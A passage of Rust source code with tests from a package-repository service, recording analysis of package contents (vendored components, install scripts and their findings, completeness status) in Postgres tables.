//! Persist what we learned by reading an artifact's own bytes (#4033).
//!
//! This is the seam between extraction and the API. The format handler pulls
//! files out of a package; [`conda_recipe`] and [`conda_scripts`] turn those
//! bytes into findings; this module writes the findings to the three tables
//! created by migration 221, and [`crate::api::handlers::package_analysis`]
//! reads them back.
//!
//! # The contract that matters
//!
//! A caller MUST record a [`Completeness`] describing how much of the package
//! it managed to read, and it must do so *even when extraction failed*. An
//! artifact with no `package_analysis` row is reported as "never analyzed";
//! an artifact with a row and `status = not_read` is reported as "we tried and
//! could not read it". Both are honest. What must never happen is a row
//! claiming `Complete` on a package whose bytes were never opened, because
//! downstream that renders as a clean bill of health — the precise defect
//! #4035/#4036 exist to remove.
//!
//! [`record_analysis`] therefore takes `Completeness` as a required argument
//! rather than deriving it from whether the inputs happen to be empty. An
//! empty component list is not evidence of anything on its own; only the
//! caller knows whether it looked.

use sqlx::PgPool;
use uuid::Uuid;

use crate::error::{AppError, Result};
use crate::services::conda_recipe::{self, RecipeFormat, SourceConfidence};
use crate::services::conda_scripts;

/// How much of a package the caller managed to read.
///
/// Mirrors the `status` CHECK in migration 221. Deliberately has no `Default`:
/// there is no safe value to fall back to, and a caller that has not decided
/// must not be able to omit it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Completeness {
    /// The payload was read in full.
    Complete,
    /// Some of the payload was read; the rest was not.
    Partial {
        reason: String,
        files_read: i32,
        files_total: i32,
    },
    /// The payload was never opened — a failed extraction, an unreadable
    /// container, a size ceiling hit before any entry was produced.
    NotRead { reason: String },
    /// This format has no content analysis implemented.
    Unsupported { reason: String },
}

impl Completeness {
    fn status(&self) -> &'static str {
        match self {
            Completeness::Complete => "complete",
            Completeness::Partial { .. } => "partial",
            Completeness::NotRead { .. } => "not_read",
            Completeness::Unsupported { .. } => "unsupported",
        }
    }

    fn reason(&self) -> Option<&str> {
        match self {
            Completeness::Complete => None,
            Completeness::Partial { reason, .. }
            | Completeness::NotRead { reason }
            | Completeness::Unsupported { reason } => Some(reason.as_str()),
        }
    }

    fn counts(&self) -> (Option<i32>, Option<i32>) {
        match self {
            Completeness::Partial {
                files_read,
                files_total,
                ..
            } => (Some(*files_read), Some(*files_total)),
            _ => (None, None),
        }
    }
}

/// A component the caller extracted itself, for formats with no recipe to
/// parse.
///
/// A wheel declares nothing about what it vendors; its native libraries are
/// discovered from the archive's own directory listing. The recipe-parsing
/// path cannot serve that case, so the caller does the extraction and hands
/// over the result.
#[derive(Debug, Clone)]
pub struct ExtractedComponent {
    pub name: String,
    /// An upstream RELEASE version, or `None`. Never an ABI/soname number --
    /// see `abi_version`.
    pub version: Option<String>,
    pub purl: Option<String>,
    pub source_url: Option<String>,
    pub git_url: Option<String>,
    pub git_rev: Option<String>,
    pub sha256: Option<String>,
    pub applied_patches: Vec<String>,
    pub confidence: SourceConfidence,
    pub detection_method: String,
    /// The library's linker name, e.g. `libwebp.so.7.1.3`.
    pub soname: Option<String>,
    /// The ELF/libtool ABI version. Recorded, never promoted to `version`.
    pub abi_version: Option<String>,
}

/// A script we found, can prove executes, and deliberately did not analyze.
///
/// Carries its own byte count rather than deriving one from `script.body`,
/// because the body may be a lossy decode of non-UTF-8 source. `U+FFFD` is
/// three bytes, so a four-byte file of invalid bytes would otherwise be
/// recorded as twelve — a wrong number in a numeric column, which is worse
/// than an absent one because nothing downstream can tell it is wrong.
#[derive(Debug, Clone)]
pub struct UnanalyzedScript {
    pub script: conda_scripts::InstallScript,
    /// Size of the ORIGINAL bytes in the archive, not of `script.body`.
    pub original_size_bytes: i64,
    /// Why no rules were run. Stored, surfaced in the API, read by a human.
    pub reason: String,
}

/// Everything the format handler extracted, ready to be analyzed.
pub struct PackageAnalysisInput {
    pub artifact_id: Uuid,
    pub format: String,
    /// Files found under `info/recipe/`, as `(filename, bytes)`. Order does
    /// not matter: [`conda_recipe::preferred_recipe_files`] decides which one
    /// is authoritative.
    pub recipe_files: Vec<(String, Vec<u8>)>,
    /// Candidate install scripts from the payload, as `(path, bytes)`. Paths
    /// that are not install scripts are ignored, so a caller may pass the
    /// whole file list rather than pre-filtering.
    pub script_files: Vec<(String, Vec<u8>)>,
    /// Install hooks whose body lives in a manifest rather than a payload file
    /// — npm's `scripts.postinstall`, for example. Already classified by the
    /// caller, since a manifest key names the hook directly and there is no
    /// path to infer it from.
    ///
    /// Kept separate from `script_files` rather than synthesised into it: a
    /// fake path would have to round-trip through `classify_script_path`, and
    /// inventing `bin/.pkg-postinstall.sh` to satisfy a regex would be a lie
    /// stored in the `path` column that a user later reads.
    pub inline_scripts: Vec<conda_scripts::InstallScript>,
    /// Scripts we found, can prove execute, and deliberately did NOT analyse,
    /// paired with the reason. The canonical case is a declared interpreter the
    /// rule engine does not read — an RPM scriptlet with
    /// `PREINPROG = /usr/bin/lua`, a Perl Debian maintainer script.
    ///
    /// These are stored with `findings = NULL`, which is a different fact from
    /// `findings = []`. Running shell rules over Lua would be wrong in both
    /// directions: it would miss real behaviour and invent matches. Dropping
    /// the script entirely would be worse still — it exists, it runs, and on
    /// RPM/Debian it runs as root.
    pub unanalyzed_scripts: Vec<UnanalyzedScript>,
    /// Components the caller extracted directly, for formats with no recipe.
    /// Merged with anything parsed out of `recipe_files`.
    pub components: Vec<ExtractedComponent>,
    pub completeness: Completeness,
}

/// Translate a [`conda_scripts::ScriptFinding`] into the JSON shape the API
/// publishes and the web client parses.
///
/// The analyzer's own field names (`rule`, `excerpt`, `explanation`) and the
/// published contract (`rule_id`, `snippet`, `description`) diverged because
/// they were specified separately — the analyzer for a Rust consumer, the
/// contract for a TypeScript one. Rather than rename the analyzer's fields and
/// churn its test suite, or loosen the client parser, the mapping is pinned
/// here at the single point where findings become stored JSON.
///
/// `title` has no analyzer equivalent: the client needs a short human label
/// distinct from the full explanation, so the rule id is humanised
/// (`remote-code-execution` -> `Remote code execution`). Deriving it rather
/// than storing a second string keeps the rule id as the one source of truth.
fn finding_to_api_json(f: &conda_scripts::ScriptFinding) -> serde_json::Value {
    let mut title = f.rule.replace('-', " ");
    if let Some(first) = title.get_mut(0..1) {
        first.make_ascii_uppercase();
    }
    serde_json::json!({
        "rule_id": f.rule,
        "severity": format!("{:?}", f.severity).to_lowercase(),
        "title": title,
        "description": f.explanation,
        "line": f.line,
        "snippet": f.excerpt,
    })
}

fn findings_to_api_json(findings: &[conda_scripts::ScriptFinding]) -> serde_json::Value {
    serde_json::Value::Array(findings.iter().map(finding_to_api_json).collect())
}

/// True for the recipe's archived copy of a script, as opposed to the copy in
/// the payload that actually executes at install time.
fn is_recipe_copy(path: &str) -> bool {
    path.contains("info/recipe/")
}

fn confidence_str(c: &SourceConfidence) -> &'static str {
    match c {
        SourceConfidence::Declared => "declared",
        SourceConfidence::Inferred => "inferred",
        SourceConfidence::Unresolved => "unresolved",
    }
}

/// Pick the authoritative recipe from what was extracted.
///
/// Returns the parsed recipe plus the filename it came from, so the caller can
/// record *which* file the components were derived from — a component sourced
/// from `meta.yaml.template` deserves less trust than one from
/// `rendered_recipe.yaml`, and that provenance is otherwise lost.
fn pick_recipe(files: &[(String, Vec<u8>)]) -> Option<(&str, RecipeFormat, Vec<u8>)> {
    for (name, format) in conda_recipe::preferred_recipe_files() {
        if let Some((found, bytes)) = files.iter().find(|(f, _)| {
            // Handlers may hand us a full path or a bare filename.
            f == name || f.ends_with(&format!("/{name}"))
        }) {
            return Some((found.as_str(), *format, bytes.clone()));
        }
    }
    None
}

/// Record analysis for a package whose only content signal is a set of install
/// hooks.
///
/// This is the shape every format except conda currently has: npm reads
/// `scripts.*` out of `package.json`, RPM reads scriptlet tags out of the
/// header, Debian reads maintainer scripts out of `control.tar`. None of them
/// has a recipe, and in each case the caller has already classified the hook,
/// so the full [`PackageAnalysisInput`] is mostly empty fields.
///
/// Exists so those formats share one wiring path instead of four near-identical
/// copies — which is both a duplication-gate concern and, more importantly, the
/// difference between fixing a bug here once and fixing it four times.
///
/// `completeness` is still required, and still means what it always means: a
/// caller that could not read the archive passes `NotRead`, never `Complete`
/// with an empty list.
pub async fn record_install_scripts(
    db: &PgPool,
    artifact_id: Uuid,
    format: &str,
    inline_scripts: Vec<conda_scripts::InstallScript>,
    unanalyzed_scripts: Vec<UnanalyzedScript>,
    completeness: Completeness,
) -> Result<()> {
    record_analysis(
        db,
        PackageAnalysisInput {
            artifact_id,
            format: format.to_string(),
            recipe_files: Vec::new(),
            script_files: Vec::new(),
            inline_scripts,
            unanalyzed_scripts,
            components: Vec::new(),
            completeness,
        },
    )
    .await
}

/// Analyze and persist. Idempotent: re-analyzing an artifact replaces its
/// previous rows rather than accumulating duplicates.
pub async fn record_analysis(db: &PgPool, input: PackageAnalysisInput) -> Result<()> {
    let PackageAnalysisInput {
        artifact_id,
        format,
        recipe_files,
        script_files,
        inline_scripts,
        unanalyzed_scripts,
        components,
        completeness,
    } = input;

    let mut tx = db
        .begin()
        .await
        .map_err(|e| AppError::Database(e.to_string()))?;

    // Replace wholesale. Analysis is a pure function of the artifact's bytes
    // plus the current rule set, so a re-run supersedes rather than adds to
    // what came before; merging would strand findings from a rule we have
    // since deleted.
    sqlx::query("DELETE FROM package_vendored_components WHERE artifact_id = $1")
        .bind(artifact_id)
        .execute(&mut *tx)
        .await
        .map_err(|e| AppError::Database(e.to_string()))?;
    sqlx::query("DELETE FROM package_install_scripts WHERE artifact_id = $1")
        .bind(artifact_id)
        .execute(&mut *tx)
        .await
        .map_err(|e| AppError::Database(e.to_string()))?;

    let (files_read, files_total) = completeness.counts();
    sqlx::query(
        "INSERT INTO package_analysis \
           (artifact_id, format, status, reason, files_total, files_read, analyzed_at) \
         VALUES ($1, $2, $3, $4, $5, $6, NOW()) \
         ON CONFLICT (artifact_id) DO UPDATE SET \
           format = EXCLUDED.format, status = EXCLUDED.status, \
           reason = EXCLUDED.reason, files_total = EXCLUDED.files_total, \
           files_read = EXCLUDED.files_read, analyzed_at = EXCLUDED.analyzed_at",
    )
    .bind(artifact_id)
    .bind(&format)
    .bind(completeness.status())
    .bind(completeness.reason())
    .bind(files_total)
    .bind(files_read)
    .execute(&mut *tx)
    .await
    .map_err(|e| AppError::Database(e.to_string()))?;

    // A recipe that fails to parse is NOT a reason to fail ingest: the package
    // is still valid and its scripts are still worth reporting. But it must
    // not silently look like "no vendored components" either, so the failure
    // is logged and the component list stays empty while `completeness`
    // continues to say what it always said.
    if let Some((source_file, recipe_format, bytes)) = pick_recipe(&recipe_files) {
        match conda_recipe::parse_recipe(&bytes, recipe_format) {
            Ok(parsed) => {
                for c in &parsed.sources {
                    let patches = serde_json::json!(c
                        .patches
                        .iter()
                        .map(|p| serde_json::json!({ "name": p }))
                        .collect::<Vec<_>>());
                    sqlx::query(
                        "INSERT INTO package_vendored_components \
                           (artifact_id, name, version, purl, source_url, git_url, git_rev, \
                            sha256, applied_patches, confidence, detection_method) \
                         VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11) \
                         ON CONFLICT (artifact_id, name, COALESCE(version, '')) DO NOTHING",
                    )
                    .bind(artifact_id)
                    .bind(&c.name)
                    .bind(c.version.as_deref())
                    .bind(c.purl.as_deref())
                    .bind(c.source_url.as_deref())
                    .bind(c.git_url.as_deref())
                    .bind(c.git_rev.as_deref())
                    .bind(c.sha256.as_deref())
                    .bind(&patches)
                    .bind(confidence_str(&c.confidence))
                    .bind(format!("recipe:{source_file}"))
                    .execute(&mut *tx)
                    .await
                    .map_err(|e| AppError::Database(e.to_string()))?;
                }
                if !parsed.unresolved_expressions.is_empty() {
                    tracing::info!(
                        artifact_id = %artifact_id,
                        count = parsed.unresolved_expressions.len(),
                        "conda recipe had unresolved template expressions"
                    );
                }
            }
            Err(e) => {
                tracing::warn!(
                    artifact_id = %artifact_id,
                    source_file = %source_file,
                    error = %e,
                    "conda recipe could not be parsed; no vendored components recorded"
                );
            }
        }
    }

    // Components the caller extracted directly (wheels, and any future format
    // with no recipe). Same table, same ON CONFLICT: a recipe-derived and a
    // caller-extracted row for the same name+version is one component seen two
    // ways, not two components.
    for c in &components {
        let patches = serde_json::json!(c
            .applied_patches
            .iter()
            .map(|p| serde_json::json!({ "name": p }))
            .collect::<Vec<_>>());
        sqlx::query(
            "INSERT INTO package_vendored_components \
               (artifact_id, name, version, purl, source_url, git_url, git_rev, \
                sha256, applied_patches, confidence, detection_method, soname, \
                abi_version) \
             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13) \
             ON CONFLICT (artifact_id, name, COALESCE(version, '')) DO NOTHING",
        )
        .bind(artifact_id)
        .bind(&c.name)
        .bind(c.version.as_deref())
        .bind(c.purl.as_deref())
        .bind(c.source_url.as_deref())
        .bind(c.git_url.as_deref())
        .bind(c.git_rev.as_deref())
        .bind(c.sha256.as_deref())
        .bind(&patches)
        .bind(confidence_str(&c.confidence))
        .bind(&c.detection_method)
        .bind(c.soname.as_deref())
        .bind(c.abi_version.as_deref())
        .execute(&mut *tx)
        .await
        .map_err(|e| AppError::Database(e.to_string()))?;
    }

    // `classify_script_path` is liberal by design, and a conda package ships
    // the SAME script body twice: once in the payload where it actually runs
    // (`bin/.pkg-post-link.sh`) and once as the recipe's copy of it
    // (`info/recipe/post-link.sh`). Reporting both would double every finding
    // on every package that has a script — and an inflated count is the
    // fastest way to make a reviewer stop trusting the number.
    //
    // Dedupe on the body digest, keeping the payload path: that is the copy
    // that executes at install time, so it is the one a reader should be
    // looking at.
    let mut by_digest: std::collections::HashMap<String, (&String, &Vec<u8>)> =
        std::collections::HashMap::new();
    for (path, bytes) in &script_files {
        if conda_scripts::classify_script_path(path).is_none() {
            continue;
        }
        let digest = hex::encode(<sha2::Sha256 as sha2::Digest>::digest(bytes));
        match by_digest.get(&digest) {
            // A path already seen wins only if the incumbent is the recipe's
            // copy and this one is not.
            Some((existing, _)) if is_recipe_copy(existing) && !is_recipe_copy(path) => {
                by_digest.insert(digest, (path, bytes));
            }
            Some(_) => {}
            None => {
                by_digest.insert(digest, (path, bytes));
            }
        }
    }

    let mut deduped: Vec<(&String, &Vec<u8>)> = by_digest.into_values().collect();
    // HashMap iteration order is nondeterministic; sort so repeated analyses
    // of the same artifact produce identical rows.
    deduped.sort_by(|a, b| a.0.cmp(b.0));

    for (path, bytes) in deduped {
        let path = path.as_str();
        // `make_script` returns None for a non-UTF8 body. The script still
        // exists and the user must be told so: we record it with a NULL body,
        // which the API renders as `content_available: false` and the UI as
        // "contents could not be read" rather than "no findings".
        match conda_scripts::make_script(path, bytes.as_slice()) {
            Some(script) => {
                let findings = findings_to_api_json(&conda_scripts::analyze_script(&script));
                insert_script(
                    &mut tx,
                    artifact_id,
                    path,
                    script.kind.as_str(),
                    bytes.len() as i64,
                    &script.sha256,
                    Some(script.body.as_str()),
                    &findings,
                )
                .await?;
            }
            None => {
                let digest = hex::encode(<sha2::Sha256 as sha2::Digest>::digest(bytes.as_slice()));
                insert_script(
                    &mut tx,
                    artifact_id,
                    path,
                    "unknown",
                    bytes.len() as i64,
                    &digest,
                    None,
                    &serde_json::json!([]),
                )
                .await?;
            }
        }
    }

    // Manifest-embedded hooks. Same analyzer, same table; only the origin of
    // the bytes differs.
    for script in &inline_scripts {
        let findings = findings_to_api_json(&conda_scripts::analyze_script(script));
        insert_script(
            &mut tx,
            artifact_id,
            &script.path,
            script.kind.as_str(),
            script.body.len() as i64,
            &script.sha256,
            Some(script.body.as_str()),
            &findings,
        )
        .await?;
    }

    // Scripts we are not qualified to judge. `findings` stays NULL and the
    // reason travels with the row; the API renders it as "not analysed", never
    // as zero findings.
    for u in &unanalyzed_scripts {
        insert_unanalyzed_script(&mut tx, artifact_id, u).await?;
    }

    tx.commit()
        .await
        .map_err(|e| AppError::Database(e.to_string()))?;
    Ok(())
}

async fn insert_unanalyzed_script(
    tx: &mut sqlx::Transaction<'_, sqlx::Postgres>,
    artifact_id: Uuid,
    u: &UnanalyzedScript,
) -> Result<()> {
    let script = &u.script;
    sqlx::query(
        "INSERT INTO package_install_scripts \
           (artifact_id, path, kind, size_bytes, sha256, body, findings, \
            analysis_skipped_reason) \
         VALUES ($1,$2,$3,$4,$5,$6,NULL,$7) \
         ON CONFLICT (artifact_id, path) DO UPDATE SET \
           kind = EXCLUDED.kind, size_bytes = EXCLUDED.size_bytes, \
           sha256 = EXCLUDED.sha256, body = EXCLUDED.body, \
           findings = NULL, \
           analysis_skipped_reason = EXCLUDED.analysis_skipped_reason",
    )
    .bind(artifact_id)
    .bind(&script.path)
    .bind(script.kind.as_str())
    .bind(u.original_size_bytes)
    .bind(&script.sha256)
    .bind(script.body.as_str())
    .bind(&u.reason)
    .execute(&mut **tx)
    .await
    .map_err(|e| AppError::Database(e.to_string()))?;
    Ok(())
}

#[allow(clippy::too_many_arguments)]
async fn insert_script(
    tx: &mut sqlx::Transaction<'_, sqlx::Postgres>,
    artifact_id: Uuid,
    path: &str,
    kind: &str,
    size_bytes: i64,
    sha256: &str,
    body: Option<&str>,
    findings: &serde_json::Value,
) -> Result<()> {
    sqlx::query(
        "INSERT INTO package_install_scripts \
           (artifact_id, path, kind, size_bytes, sha256, body, findings) \
         VALUES ($1,$2,$3,$4,$5,$6,$7) \
         ON CONFLICT (artifact_id, path) DO UPDATE SET \
           kind = EXCLUDED.kind, size_bytes = EXCLUDED.size_bytes, \
           sha256 = EXCLUDED.sha256, body = EXCLUDED.body, \
           findings = EXCLUDED.findings",
    )
    .bind(artifact_id)
    .bind(path)
    .bind(kind)
    .bind(size_bytes)
    .bind(sha256)
    .bind(body)
    .bind(findings)
    .execute(&mut **tx)
    .await
    .map_err(|e| AppError::Database(e.to_string()))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn f(name: &str) -> (String, Vec<u8>) {
        (name.to_string(), b"x".to_vec())
    }

    #[test]
    fn pick_recipe_prefers_rendered_over_template() {
        let files = vec![
            f("meta.yaml.template"),
            f("meta.yaml"),
            f("rendered_recipe.yaml"),
        ];
        let (name, format, _) = pick_recipe(&files).expect("a recipe");
        assert_eq!(name, "rendered_recipe.yaml");
        assert_eq!(format, RecipeFormat::RenderedRecipeYaml);
    }

    #[test]
    fn pick_recipe_falls_back_through_the_preference_order() {
        let files = [f("meta.yaml.template"), f("meta.yaml")];
        let (name, _, _) = pick_recipe(&files).unwrap();
        assert_eq!(name, "meta.yaml", "rendered beats the raw template");

        let files = [f("meta.yaml.template")];
        let (name, _, _) = pick_recipe(&files).unwrap();
        assert_eq!(name, "meta.yaml.template", "last resort is still used");
    }

    #[test]
    fn pick_recipe_matches_full_paths_not_just_bare_names() {
        let files = [f("info/recipe/rendered_recipe.yaml")];
        let (name, _, _) = pick_recipe(&files).unwrap();
        assert_eq!(name, "info/recipe/rendered_recipe.yaml");
    }

    #[test]
    fn pick_recipe_is_none_when_there_is_no_recipe() {
        assert!(pick_recipe(&[f("info/index.json"), f("README.md")]).is_none());
    }

    #[test]
    fn pick_recipe_ignores_a_lookalike_suffix() {
        // "not-meta.yaml" must not satisfy the "meta.yaml" entry: the suffix
        // match is anchored on a path separator precisely so a file merely
        // ENDING in a preferred name cannot impersonate it.
        assert!(pick_recipe(&[f("not-meta.yaml")]).is_none());
    }

    #[test]
    fn completeness_never_reports_a_reasonless_incomplete_state() {
        // Mirrors the CHECK constraint in migration 221: anything that is not
        // `complete` must carry a reason, or the row is rejected by the DB.
        for c in [
            Completeness::Partial {
                reason: "ceiling".into(),
                files_read: 1,
                files_total: 2,
            },
            Completeness::NotRead {
                reason: "unreadable".into(),
            },
            Completeness::Unsupported {
                reason: "no analyzer".into(),
            },
        ] {
            assert_ne!(c.status(), "complete");
            assert!(c.reason().is_some(), "{:?} must carry a reason", c);
        }
        assert_eq!(Completeness::Complete.status(), "complete");
        assert!(Completeness::Complete.reason().is_none());
    }

    #[test]
    fn only_partial_carries_file_counts() {
        assert_eq!(
            Completeness::Partial {
                reason: "r".into(),
                files_read: 3,
                files_total: 7
            }
            .counts(),
            (Some(3), Some(7))
        );
        assert_eq!(Completeness::Complete.counts(), (None, None));
        assert_eq!(
            Completeness::NotRead { reason: "r".into() }.counts(),
            (None, None)
        );
    }
}

/// DB-backed tests for [`record_analysis`] (#4033).
///
/// Everything below writes through the real transaction against a real
/// Postgres, because the invariants worth pinning are invariants of what
/// lands in the three tables — a replaced row, a deduplicated script, a NULL
/// that is not an empty array — and none of them is observable from the pure
/// helpers above.
///
/// Every row these tests write is keyed on an artifact created by
/// [`seed_artifact`], so they need no serialization against the rest of the
/// suite. Skips cleanly when no `DATABASE_URL` is configured; under
/// [`crate::testing::REQUIRE_DB_ENV`] (CI) an unreachable database fails
/// loudly instead of reporting a false PASS (#2924).
#[cfg(test)]
mod db_tests {
    use super::*;
    use crate::services::conda_scripts::ScriptKind;
    use sqlx::Row;

    async fn try_pool() -> Option<PgPool> {
        crate::testing::try_pool_with(3).await
    }

    /// The FK chain is `package_analysis.artifact_id -> artifacts ->
    /// repositories`, so every test needs both parents. One helper, reused:
    /// four copy-pasted setups would trip the duplication gate and would be
    /// four places to fix when a NOT NULL column is added.
    async fn seed_artifact(pool: &PgPool) -> Uuid {
        // Reap this module's OWN fixtures from earlier runs before adding
        // another. Nothing here needs it for correctness — every assertion is
        // scoped to the artifact created below — but `repositories` is
        // cluster-wide state that other suites list UNSCOPED with a LIMIT
        // (`api::handlers::projects::tests::db::        // test_listing_visibility_and_project_filter` asserts its own
        // repository is on page one of `ORDER BY name LIMIT 100`), so a suite
        // that leaks a row per test per run eventually pushes somebody else's
        // fixture off that page. The grace period is orders of magnitude
        // longer than these tests take, so a sibling nextest process holding a
        // live fixture is never reaped out from under itself.
        sqlx::query(
            "DELETE FROM repositories              WHERE key LIKE 'pa-%' AND created_at < NOW() - INTERVAL '10 minutes'",
        )
        .execute(pool)
        .await
        .expect("reap stale fixtures");

        let repo = Uuid::new_v4();
        let key = format!("pa-{}", &repo.to_string()[..8]);
        sqlx::query(
            "INSERT INTO repositories \
               (id, key, name, format, repo_type, storage_backend, storage_path, is_public) \
             VALUES ($1, $2, $2, 'generic'::repository_format, 'local'::repository_type, \
                     'filesystem', $3, true)",
        )
        .bind(repo)
        .bind(&key)
        .bind(format!("/data/{key}"))
        .execute(pool)
        .await
        .expect("insert repository");

        let artifact = Uuid::new_v4();
        sqlx::query(
            "INSERT INTO artifacts \
               (id, repository_id, path, name, size_bytes, checksum_sha256, content_type, \
                storage_key, is_deleted) \
             VALUES ($1, $2, $3, $3, 1024, repeat('a', 64), 'application/octet-stream', $4, false)",
        )
        .bind(artifact)
        .bind(repo)
        .bind(format!("{key}/pkg-1.0-0.conda"))
        .bind(format!("cas/{artifact}"))
        .execute(pool)
        .await
        .expect("insert artifact");
        artifact
    }

    /// A [`PackageAnalysisInput`] with nothing extracted. Tests fill in only
    /// the field they are about, which keeps each one readable as a statement
    /// about that field.
    fn empty_input(artifact_id: Uuid, completeness: Completeness) -> PackageAnalysisInput {
        PackageAnalysisInput {
            artifact_id,
            format: "conda".to_string(),
            recipe_files: Vec::new(),
            script_files: Vec::new(),
            inline_scripts: Vec::new(),
            unanalyzed_scripts: Vec::new(),
            components: Vec::new(),
            completeness,
        }
    }

    fn extracted(name: &str, version: Option<&str>) -> ExtractedComponent {
        ExtractedComponent {
            name: name.to_string(),
            version: version.map(str::to_string),
            purl: None,
            source_url: None,
            git_url: None,
            git_rev: None,
            sha256: None,
            applied_patches: Vec::new(),
            confidence: SourceConfidence::Inferred,
            detection_method: "caller".to_string(),
            soname: None,
            abi_version: None,
        }
    }

    /// A rendered conda-build `meta.yaml`: one resolvable source plus one
    /// entry with no locator, which the parser reports as an unresolved
    /// expression rather than dropping.
    const META_YAML: &str = r#"
package:
  name: pillow
  version: '10.2.0'
source:
  - url: https://pypi.io/packages/source/p/pillow/pillow-10.2.0.tar.gz
    sha256: e87f0b2c78157e12d7686b27d63c070fd65d994e8ddae6f328e0dcf4a0cd007e
    patches:
      - 0001-fix-cve-2023-4863.patch
  - folder: vendored-but-unlocatable
about:
  home: https://python-pillow.org
"#;

    struct AnalysisRow {
        format: String,
        status: String,
        reason: Option<String>,
        files_total: Option<i32>,
        files_read: Option<i32>,
    }

    /// Returned as a `Vec` so callers can assert on the ROW COUNT: "exactly
    /// one analysis row" is half of the re-analysis invariant.
    async fn analysis_rows(pool: &PgPool, artifact: Uuid) -> Vec<AnalysisRow> {
        sqlx::query(
            "SELECT format, status, reason, files_total, files_read \
             FROM package_analysis WHERE artifact_id = $1",
        )
        .bind(artifact)
        .fetch_all(pool)
        .await
        .expect("read package_analysis")
        .into_iter()
        .map(|r| AnalysisRow {
            format: r.get("format"),
            status: r.get("status"),
            reason: r.get("reason"),
            files_total: r.get("files_total"),
            files_read: r.get("files_read"),
        })
        .collect()
    }

    struct ComponentRow {
        name: String,
        version: Option<String>,
        purl: Option<String>,
        sha256: Option<String>,
        applied_patches: serde_json::Value,
        confidence: String,
        detection_method: Option<String>,
        soname: Option<String>,
        abi_version: Option<String>,
    }

    async fn component_rows(pool: &PgPool, artifact: Uuid) -> Vec<ComponentRow> {
        sqlx::query(
            "SELECT name, version, purl, sha256, applied_patches, confidence, \
                    detection_method, soname, abi_version \
             FROM package_vendored_components WHERE artifact_id = $1 ORDER BY name",
        )
        .bind(artifact)
        .fetch_all(pool)
        .await
        .expect("read package_vendored_components")
        .into_iter()
        .map(|r| ComponentRow {
            name: r.get("name"),
            version: r.get("version"),
            purl: r.get("purl"),
            sha256: r.get("sha256"),
            applied_patches: r.get("applied_patches"),
            confidence: r.get("confidence"),
            detection_method: r.get("detection_method"),
            soname: r.get("soname"),
            abi_version: r.get("abi_version"),
        })
        .collect()
    }

    struct ScriptRow {
        path: String,
        kind: String,
        size_bytes: i64,
        body: Option<String>,
        findings: Option<serde_json::Value>,
        skipped_reason: Option<String>,
    }

    async fn script_rows(pool: &PgPool, artifact: Uuid) -> Vec<ScriptRow> {
        sqlx::query(
            "SELECT path, kind, size_bytes, body, findings, analysis_skipped_reason \
             FROM package_install_scripts WHERE artifact_id = $1 ORDER BY path",
        )
        .bind(artifact)
        .fetch_all(pool)
        .await
        .expect("read package_install_scripts")
        .into_iter()
        .map(|r| ScriptRow {
            path: r.get("path"),
            kind: r.get("kind"),
            size_bytes: r.get("size_bytes"),
            body: r.get("body"),
            findings: r.get("findings"),
            skipped_reason: r.get("analysis_skipped_reason"),
        })
        .collect()
    }

    /// INVARIANT 1: `Completeness` is a required argument, never derived from
    /// emptiness. A caller that passed `NotRead` with zero components must
    /// produce a row that CANNOT be read as a clean bill of health — the
    /// precise defect #4035/#4036 exist to remove.
    #[tokio::test]
    async fn not_read_with_no_components_is_not_readable_as_clean() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        record_analysis(
            &pool,
            empty_input(
                artifact,
                Completeness::NotRead {
                    reason: "archive exceeded the 2 GiB extraction ceiling".to_string(),
                },
            ),
        )
        .await
        .expect("record_analysis");

        let rows = analysis_rows(&pool, artifact).await;
        assert_eq!(rows.len(), 1);
        assert_eq!(
            rows[0].status, "not_read",
            "an empty component list must not be laundered into 'complete'"
        );
        assert_eq!(
            rows[0].reason.as_deref(),
            Some("archive exceeded the 2 GiB extraction ceiling"),
            "the reason is what the UI renders instead of 'no findings'"
        );
        assert_eq!(rows[0].format, "conda");
        assert!(component_rows(&pool, artifact).await.is_empty());
        assert!(script_rows(&pool, artifact).await.is_empty());
    }

    /// The same zero inputs with `Complete` are a different, equally honest
    /// fact: we opened the package and it vendors nothing. Paired with the
    /// test above, this is the whole point of taking `Completeness` as an
    /// argument — identical inputs, different stored meaning.
    #[tokio::test]
    async fn partial_records_the_file_counts_and_complete_records_none() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        record_analysis(
            &pool,
            empty_input(
                artifact,
                Completeness::Partial {
                    reason: "3 of 9 entries exceeded the per-file ceiling".to_string(),
                    files_read: 6,
                    files_total: 9,
                },
            ),
        )
        .await
        .expect("record partial");
        let rows = analysis_rows(&pool, artifact).await;
        assert_eq!(rows[0].status, "partial");
        assert_eq!(
            (rows[0].files_read, rows[0].files_total),
            (Some(6), Some(9))
        );

        record_analysis(&pool, empty_input(artifact, Completeness::Complete))
            .await
            .expect("record complete");
        let rows = analysis_rows(&pool, artifact).await;
        assert_eq!(rows[0].status, "complete");
        assert_eq!(rows[0].reason, None, "a complete read explains nothing");
        assert_eq!(
            (rows[0].files_read, rows[0].files_total),
            (None, None),
            "stale counts from the previous partial run must not survive"
        );
    }

    /// INVARIANT 2: re-analysis REPLACES, it does not accumulate. Analysis is
    /// a pure function of the bytes plus the current rule set, so a second run
    /// supersedes the first; merging would strand a finding from a rule we
    /// have since deleted.
    #[tokio::test]
    async fn re_analysis_replaces_the_previous_rows_rather_than_accumulating() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        let mut first = empty_input(artifact, Completeness::Complete);
        first.components = vec![extracted("libwebp", Some("1.3.2")), extracted("zlib", None)];
        first.script_files = vec![(
            "bin/.pkg-post-link.sh".to_string(),
            b"#!/bin/sh\necho hi\n".to_vec(),
        )];
        // An un-analysed script too: it is written by a DIFFERENT insert, so a
        // replace that forgot one table would strand this row specifically.
        first.unanalyzed_scripts = vec![UnanalyzedScript {
            script: conda_scripts::make_inline_script(
                ScriptKind::RpmPost,
                "rpm:scriptlet/%post",
                "-- lua\n",
            ),
            original_size_bytes: 8,
            reason: "declared interpreter /usr/bin/lua is not analysed".to_string(),
        }];
        record_analysis(&pool, first).await.expect("first run");
        assert_eq!(component_rows(&pool, artifact).await.len(), 2);
        assert_eq!(script_rows(&pool, artifact).await.len(), 2);

        // Second run: the same artifact, a rule set that no longer reports
